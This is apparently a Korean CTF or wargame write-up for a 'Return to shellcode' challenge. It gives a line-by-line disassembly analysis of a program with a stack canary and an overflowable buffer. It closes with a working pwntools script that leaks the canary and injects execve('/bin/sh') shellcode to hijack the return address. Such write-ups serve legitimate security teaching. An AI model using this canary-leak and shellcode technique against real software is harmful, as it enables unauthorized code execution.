# Return to shellcode

## 어셈블리 분석

### main

```asm
0x5555554008d1 <main+4>     sub    rsp, 0x60
```

- `rsp` 레지스터 에게 `0x60(96 바이트)` 만큼 감소 시켜, `stack`에 `0x60(96 바이트)` 공간을 확보

```asm
0x5555554008d5 <main+8>     mov    rax, qword ptr fs:[0x28]
```

- **스택 보호용 Canary 값 `fs:[0x28]`** 를 `rax` 레지스터 에게 복사

```asm
0x5555554008de <main+17>    mov    qword ptr [rbp - 8], rax 
```

- `rbp` 레지스터의 값: `0x7fffffffdd60`
- `qword ptr [rbp - 8]` 연산 수행 → `0x7fffffffdd60` - `0x8` = `0x7fffffffdd58`
- `0x7fffffffdd58` 스택에게 `rax` 레지스터 값 복사
- `main` 함수 종료 시 **Canary 무결성 검증에 사용**.

```asm
0x5555554008e2 <main+21>    xor    eax, eax
0x5555554008e4 <main+23>    mov    eax, 0
```

- `init` 함수 호출 직전 `eax` 값 제거

```asm
0x5555554008e9 <main+28>    call   init 
```

- `init` 함수 호출

---

#### init

```asm
0x55555540088a <init>       push   rbp
0x55555540088b <init+1>     mov    rbp, rsp 
```

- `push rbp`: **현재 함수가 끝난 뒤, 이전 함수로 정확하게 돌아가기 위한 기준점 저장**
- `mov rbp, rsp`: **새로운 스택 프레임으로 전환**

```asm
0x55555540088e <init+4>     mov    rax, qword ptr [rip + 0x20078b]
```

- `rip`의 값: `0x555555400895`
- `[rip + 0x20078b]` 연산 수행 → `0x555555400895` + `0x20078b` = `0x555555601020`
- `0x555555601020`의 주소 안의 값: **<stdin@@GLIBC_2.2.5>: `0x00007ffff7f998e0`**
- 최종: **[stdin@@GLIBC_2.2.5] => 0x7ffff7f998e0 (_IO_2_1_stdin_) ◂— 0xfbad2088** 값을 가져온다.

```asm
0x555555400895 <init+11>    mov    ecx, 0                              
0x55555540089a <init+16>    mov    edx, 2                              
0x55555540089f <init+21>    mov    esi, 0                              
0x5555554008a4 <init+26>    mov    rdi, rax
```

- `ecx` 레지스터 에게 `0` 의 값 복사 → 네 번째 인자
- `edx` 레지스터 에게 `2` 의 값 복사 → 세 번째 인자
- `esi` 레지스터 에게 `0` 의 값 복사 → 두 번째 인자
- `rdi` 레지스터 에게 `rax`의 값 (`0x00007ffff7f998e0`) 복사 → 첫 번째 인자

```asm
0x5555554008a7 <init+29>    call   setvbuf@plt 
```

- `setvbuf` 함수 호출
> 최종: **setvbuf(0x00007ffff7f998e0(IO_2_1_stdin_), 0, 2, 0);**

```asm
0x5555554008ac <init+34>    mov    rax, qword ptr [rip + 0x20075d]
```

- `rip`의 값: `0x5555554008b3`
- `[rip + 0x20075d]` 연산 수행 → `0x5555554008b3` + `0x20075d` = `0x555555601010`
- `0x555555601010`의 주소 안의 값: **<stdout@@GLIBC_2.2.5>: `0x00007ffff7f9a5c0`**
- 최종: **[stdout@@GLIBC_2.2.5] => 0x7ffff7f9a5c0 (_IO_2_1_stdout_) ◂— 0xfbad2084** 값을 가져온다.

```asm
0x5555554008b3 <init+41>    mov    ecx, 0                              
0x5555554008b8 <init+46>    mov    edx, 2                              
0x5555554008bd <init+51>    mov    esi, 0                              
0x5555554008c2 <init+56>    mov    rdi, rax 
```

- `ecx` 레지스터 에게 `0` 의 값 복사 → 네 번째 인자
- `edx` 레지스터 에게 `2` 의 값 복사 → 세 번째 인자
- `esi` 레지스터 에게 `0` 의 값 복사 → 두 번째 인자
- `rdi` 레지스터 에게 `rax`의 값 (`0x00007ffff7f9a5c0`) 복사 → 첫 번째 인자

```asm
0x5555554008c5 <init+59>    call   setvbuf@plt
```

- `setvbuf` 함수 호출
> 최종: **setvbuf(0x00007ffff7f9a5c0(_IO_2_1_stdout_), 0, 2, 0);**


```asm
0x5555554008ca <init+64>    nop    
0x5555554008cb <init+65>    pop    rbp
0x5555554008cc <init+66>    ret
```

- `init` 함수 종료를 위한 정리 작업: 스택 프레임 복구(`pop rbp`) 후 리턴(`ret`)

---

#### init 최종 C언어 예측

```c
void init() {
    setvbuf(0x00007ffff7f998e0(IO_2_1_stdin_), 0, 2, 0);
    setvbuf(0x00007ffff7f9a5c0(_IO_2_1_stdout_), 0, 2, 0);
}
```

---

### main

```asm
0x5555554008ee <main+33>    lea    rax, [rbp - 0x60]
```

- 현재 `rbp`의 값:  `0x7fffffffdd60`
- `[rbp - 0x60]` 연산 수행 → `0x7fffffffdd60` - `0x60` = `0x7fffffffdd00`
- 위 값 (`0x7fffffffdd00`)을 `rax` 레지스터 에게 로드

```asm
0x5555554008f2 <main+37>    mov    rsi, rax
```

- `rsi` 레지스터 에게 `rax`의 값 (`0x7fffffffdd00`)을 복사
- `rsi`는 두 번째 인자

```asm
0x5555554008f5 <main+40>    lea    rdi, [rip + 0x16c]
```

- `rip`의 값: `0x5555554008fc`
- `[rip + 0x16c]` 연산 수행 → `0x5555554008fc` + `0x16c` = `0x555555400a68`
- `0x555555400a68` 주소 값 분석 → **0x555555400a68: "Address of the buf: %p\n"**
- `rdi` 레지스터 에게 `0x555555400a68` 주소 값 을 로드
- `rdi`는 첫 번째 인자

```asm
0x5555554008fc <main+47>    mov    eax, 0
0x555555400901 <main+52>    call   printf@plt
```

- `eax` 레지스터 에게 `0`의 값 복사
- `printf` 같이 가변 인자 함수(variadic function) 를 호출할 때 필수적인 준비 작업

- 그 후 `printf` 함수 호출
> 최종: **printf(Address of the buf: %p\n, 0x7fffffffdd00[rbp - 0x60]);**

```asm
0x555555400906 <main+57>    mov    rax, rbp
```

- `rbp` 레지스터 의 값: `0x7fffffffdd60`
- 위 값을 `rax` 레지스터에게 복사

```asm
0x555555400909 <main+60>    mov    rdx, rax
```

- `rax` 레지스터 의 값: `0x7fffffffdd60`
- 위 값을 `rdx` 레지스터에게 복사

```asm
0x55555540090c <main+63>    lea    rax, [rbp - 0x60]
```

- 현재 `rbp`의 값:  `0x7fffffffdd60`
- `[rbp - 0x60]` 연산 수행 → `0x7fffffffdd60` - `0x60` = `0x7fffffffdd00`
- 위 값 (`0x7fffffffdd00`)을 `rax` 레지스터 에게 로드

```asm
0x555555400910 <main+67>    sub    rdx, rax
```

- 현재 `rax`값 : `0x7fffffffdd00`
- `rdx` 값과 `rax` 값 빼기(`-`) 연산 수행 → `0x7fffffffdd60` - `0x7fffffffdd00` = `0x60(96)`
- `rdx`의 값 : `0x60(96)`

```asm
0x555555400913 <main+70>    mov    rax, rdx
```

- 현재 `rdx` 값: `0x60(96)`
- `rax` 레지스터 에게 `0x60(96)` 값을 복사

```asm
0x555555400916 <main+73>    mov    rsi, rax
```

- 현재 `rax` 값: `0x60(96)`
- `rsi` 레지스터 에게 `0x60(96)` 값을 복사
- `rsi`값 은 두 번째 인자

```asm
0x555555400919 <main+76>    lea    rdi, [rip + 0x160] 
```

- 현재 `rip` 값: `0x555555400920`
- `[rip + 0x160]` 연산 수행 → `0x555555400920` + `0x160` = `0x555555400a80`
- `0x555555400a80` 주소 안의 값 → `0x555555400a80`: **"Distance between buf and $rbp: %ld\n"**
- 위의 값을 `rdi` 레지스터 에게 로드
- `rdi` 값은 첫 번째 인자

```asm
0x555555400920 <main+83>    mov    eax, 0       
0x555555400925 <main+88>    call   printf@plt
```

- `eax` 레지스터 에게 `0`의 값 복사 후, `printf` 함수 호출
> 최종: **printf("Distance between buf and $rbp: %ld\n", 0x60(96));**

```asm
0x55555540092a <main+93>     lea    rdi, [rip + 0x173]
```

- `rip`의 값: `0x555555400931`
- `[rip + 0x173]` 연산 수행 → `0x555555400931` + `0x173` = `0x555555400aa4`
- `0x555555400aa4` 주소 안의 값 분석: **`0x555555400aa4`: "[1] Leak the canary"**
- `rdi` 값은 첫 번째 인자

```asm
x555555400931 <main+100>    call   puts@plt
```

- `puts` 함수 호출
> 최종: **puts("[1] Leak the canary");**

```asm
0x555555400936 <main+105>    lea    rdi, [rip + 0x17b]
```

- `rip`의 값: `0x55555540093d`
- `[rip + 0x17b]` 연산 수행 → `0x55555540093d` + `0x17b` = `0x555555400ab8`
- `0x555555400ab8` 주소 안의 값 → **0x555555400ab8: "Input: "**
- `rdi` 값은 첫 번째 인자

```asm
0x55555540093d <main+112>    mov    eax, 0                 
0x555555400942 <main+117>    call   printf@plt
```

- `eax` 레지스터 에게 `0`의 값 복사 후, `printf` 함수 호출
> 최종: **printf("Input: ");**

```asm
0x555555400947 <main+122>    mov    rax, qword ptr [rip + 0x2006c2]
```

- `rip`의 값: `0x55555540094e`
- `[rip + 0x2006c2]` 연산 수행 → `0x55555540094e` + `0x2006c2` = `0x555555601010`
- `0x555555601010` 주소 내부 분석 → **0x7ffff7f9a5c0 (_IO_2_1_stdout_) ◂— 0xfbad2887**
- 위 값(`0x7ffff7f9a5c0`)을 `rax` 레지스터 에게 로드 


```asm
0x55555540094e <main+129>    mov    rdi, rax 
```

- `rdi` 레지스터 에게 `rax`의 값(`0x7ffff7f9a5c0`) 을 복사
- `rdi` 값은 첫 번째 인자

```asm
0x555555400951 <main+132>    call   fflush@plt
```

- `fflush` 함수 호출
> 최종: **fflush(0x7ffff7f9a5c0(_IO_2_1_stdout_));**

```asm
0x555555400956 <main+137>    lea    rax, [rbp - 0x60]
```

- 현재 `rbp`의 값:  `0x7fffffffdd60`
- `[rbp - 0x60]` 연산 수행 → `0x7fffffffdd60` - `0x60` = `0x7fffffffdd00`
- 위 값 (`0x7fffffffdd00`)을 `rax` 레지스터 에게 로드 (현재 `rsp` 값)

```asm
0x55555540095a <main+141>    mov    edx, 0x100
```

- `edx` 레지스터 에게 `0x100(256)` 값 복사
- `edx` 는 세 번째 인자

```asm
0x55555540095f <main+146>    mov    rsi, rax 
```

- 현재 `rax` 값: `0x7fffffffdd00`(스택 최상단 주소)
- `rsi` 레지스터 에게 복사
- `rsi` 는 두 번째 인자

```asm
0x555555400962 <main+149>    mov    edi, 0 
```

- `edi` 레지스터 에게 `0` 값 복사
- `edi` 는 첫 번째 인자

```asm
0x555555400967 <main+154>    call   read@plt
```

- `read` 함수 호출
> 최종: **read(0, 0x7fffffffdd00, 0x100);**

```asm
0x55555540096c <main+159>    lea    rax, [rbp - 0x60] 
```

- 현재 `rbp`의 값:  `0x7fffffffdd60`
- `[rbp - 0x60]` 연산 수행 → `0x7fffffffdd60` - `0x60` = `0x7fffffffdd00`
- 위 값 (`0x7fffffffdd00`)을 `rax` 레지스터 에게 로드 (현재 `rsp` 값)

```asm
0x555555400970 <main+163>    mov    rsi, rax
```

- 현재 `rax` 값: `0x7fffffffdd00`(스택 최상단 주소)
- `rsi` 레지스터 에게 복사
- `rsi` 는 두 번째 인자

```asm
0x555555400973 <main+166>    lea    rdi, [rip + 0x146]
```

- 현재 `rip` 값: `0x55555540097a`
- `[rip + 0x146]` 연산 수행 → `0x55555540097a` + `0x146` = `0x555555400ac0`
- `0x555555400ac0` 주소 값 분석 → **0x555555400ac0: "Your input is '%s'\n"**
- 위 값을 `rdi` 레지스터 에게 로드
- `rdi` 는 첫 번째 인자

```asm
0x55555540097a <main+173>    mov    eax, 0                 
0x55555540097f <main+178>    call   printf@plt
```

- `eax` 레지스터 에게 `0`의 값 복사 후, `printf` 함수 호출
> 최종: **printf("Your input is '%s'\n", 0x7fffffffdd00(`rsp` 값));**

```asm
0x555555400984 <main+183>    lea    rdi, [rip + 0x14d]
```

- 현재 `rip` 값: `0x55555540098b`
- `[rip + 0x14d]` 연산 수행 → `0x55555540098b` + `0x14d` = `0x555555400ad8`
- `0x555555400ad8` 주소 값 분석 → **0x555555400ad8: "[2] Overwrite the return address"**
- 위의 값을 `rdi` 레지스터 에게 로드
- `rdi`는 첫 번째 인자

```asm
0x55555540098b <main+190>    call   puts@plt
```

- `puts` 함수 호출
> 최종: **puts("[2] Overwrite the return address");**

```asm
0x555555400990 <main+195>    lea    rdi, [rip + 0x121]
```

- 현재 `rip` 값: `0x555555400997`
- `[rip + 0x121]` 연산 수행 → `0x555555400997` + `0x121` = `0x555555400ab8`
- `0x555555400ab8` 주소 값 분석 → **0x555555400ab8: "Input: "**
- 위의 값을 `rdi` 레지스터 에게 로드
- `rdi`는 첫 번째 인자

```asm
0x555555400997 <main+202>    mov    eax, 0              
0x55555540099c <main+207>    call   printf@plt 
```

- `eax` 레지스터 에게 `0`의 값 복사 후, `printf` 함수 호출
> 최종: **printf("Input: ");**

```asm
0x5555554009a1 <main+212>    mov    rax, qword ptr [rip + 0x200668]
```

- 현재 `rip` 값: `0x5555554009a8`
- `[rip + 0x200668]` 연산 수행 → `0x5555554009a8` + `0x200668` = `0x555555601010`
- `0x555555601010` 주소 값 분석 → **0x7ffff7f9a5c0 <_IO_2_1_stdout_>: 0x00000000fbad2887**
- 위의 값(`0x7ffff7f9a5c0`)을 `rax` 레지스터 에게 로드

```asm
0x5555554009a8 <main+219>    mov    rdi, rax
```

- `rdi` 레지스터 에게 `rax` 값 복사
- `rdi`는 첫 번째 인자

```asm
0x5555554009ab <main+222>    call   fflush@plt
```

- `fflush` 함수 호출
> 최종: **fflush(0x7ffff7f9a5c0<_IO_2_1_stdout_>);**

```asm
0x5555554009b0 <main+227>    lea    rax, [rbp - 0x60]
```

- 현재 `rbp`의 값:  `0x7fffffffdd60`
- `[rbp - 0x60]` 연산 수행 → `0x7fffffffdd60` - `0x60` = `0x7fffffffdd00`
- 위 값 (`0x7fffffffdd00`)을 `rax` 레지스터 에게 로드 (현재 `rsp` 값)

```asm
0x5555554009b4 <main+231>    mov    rdi, rax 
```

- `rdi` 레지스터에게 `rax` 값(`0x7fffffffdd00`) 을 복사
- `rdi`는 첫 번째 인자

```asm
0x5555554009b7 <main+234>    mov    eax, 0                              
0x5555554009bc <main+239>    call   gets@plt
```


- `eax` 레지스터 에게 `0`의 값 복사 후, `gets` 함수 호출
> 최종: **gets(0x7fffffffdd00(`rsp` 값));**

```asm
0x5555554009c1 <main+244>    mov    eax, 0                       
0x5555554009c6 <main+249>    mov    rcx, qword ptr [rbp - 8]     
```

- 함수 시작 시 저장한 스택 카나리 값을 로드
- 일반적으로 함수 prologue에서 `mov qword ptr [rbp - 8], fs:[0x28]` 로 저장해 둠

```asm
0x5555554009ca <main+253>    xor    rcx, qword ptr fs:[0x28]
```

- 현재 **TLS(Thread Local Storage)** 에 저장된 **원래 카나리 값과 비교**.
- XOR 결과가 `0`이면 값이 변하지 않았다는 뜻.

```asm
0x5555554009d3 <main+262>  ✔ je     main+269 

0x5555554009da <main+269>    leave  
0x5555554009db <main+270>    ret 
```

- 차이점:
    - **`rcx` 값과 같으면**: leave → ret 로 함수 종료.
    - **`rcx` 값과 다르면**: 만약 XOR 결과가 `0`이 아니라면 `je`가 성립하지 않아서, **뒤에 숨겨진 __stack_chk_fail() 같은 보안 함수가 호출됨** → **프로그램 강제 종료**

---

#### main 최종 c언어 추측

```c
int main() {
    char buf[0x60]; // 0x7fffffffdd00 == buf (변수 유추)

    init();
    printf("Address of the buf: %p\n", buf);
    printf("Distance between buf and $rbp: %ld\n", 0x60(96));
    puts("[1] Leak the canary");
    printf("Input: ");
    fflush(0x7ffff7f9a5c0(_IO_2_1_stdout_));
    read(0, buf, 0x100);

    printf("Your input is '%s'\n", buf);
    puts("[2] Overwrite the return address");
    printf("Input: ");
    fflush(0x7ffff7f9a5c0(_IO_2_1_stdout_));

    gets(buf);
    return 0;
}
```

> **위 코드는 실제 소스코드를 보지 않고, 리버싱 분석만으로 추정한 C 코드입니다.**

## 결론

### 구조 분석

- 현재 **스택 보호용 Canary** 활성화 중 → (`__stack_chk_fail` 존재 확인됨)
- `buf`은 `0x60` → **96바이트 크기의 버퍼.**
- 이 `0x60(96 바이트)` 값은 **Padding + Canary + Saved RBP** 값을 포함 한 위치
- **Canary** 위치는 `[rbp - 8]`의 주소에 위치 → 즉, **buf[88]부터 canary가 시작**됨.
- **Canary** 는 **맨 앞 바이트가 널바이트 (`\x00`)**로 고정됨. → 나머지 7바이트만 유출 가능.

---

### 파이썬 스크립트

```python
from pwn import *

p = process('./canary')

p.recvuntil(b'buf: ')
buf = int(p.recvline(), 16)

offset = 88

padding = b'A' * (offset + 1)
p.sendafter(b'Input: ', padding)
p.recvuntil(padding)
canary = u64(b'\x00' + p.recvn(7))

shellcode = (
    b'\x48\x31\xc0'                              # xor    rax, rax              ; rax = 0 (clear syscall number)
    b'\x50'                                      # push   rax                   ; push NULL (for string termination)
    b'\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68'  # mov rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    b'\x53'                                      # push   rbx                   ; push "//bin/sh" string onto stack
    b'\x48\x89\xe7'                              # mov    rdi, rsp              ; rdi = pointer to "/bin/sh"
    b'\x48\x31\xf6'                              # xor    rsi, rsi              ; rsi = 0 (argv = NULL)
    b'\x48\x31\xd2'                              # xor    rdx, rdx              ; rdx = 0 (envp = NULL)
    b'\xb0\x38'                                  # mov    al, 56                ; rax = 56
    b'\x48\xff\xc0'                              # inc    rax                   ; rax = 57
    b'\x48\xff\xc0'                              # inc    rax                   ; rax = 58
    b'\x48\xff\xc0'                              # inc    rax                   ; rax = 59 (execve syscall number)
    b'\x0f\x05'                                  # syscall                      ; execve("/bin/sh", NULL, NULL)
)

padding2 = b'B' * (offset - len(shellcode))

payload = shellcode
payload += padding2
payload += p64(canary) 
payload += b'B' * 8 
payload += p64(buf)

p.sendline(payload)

p.interactive()
```
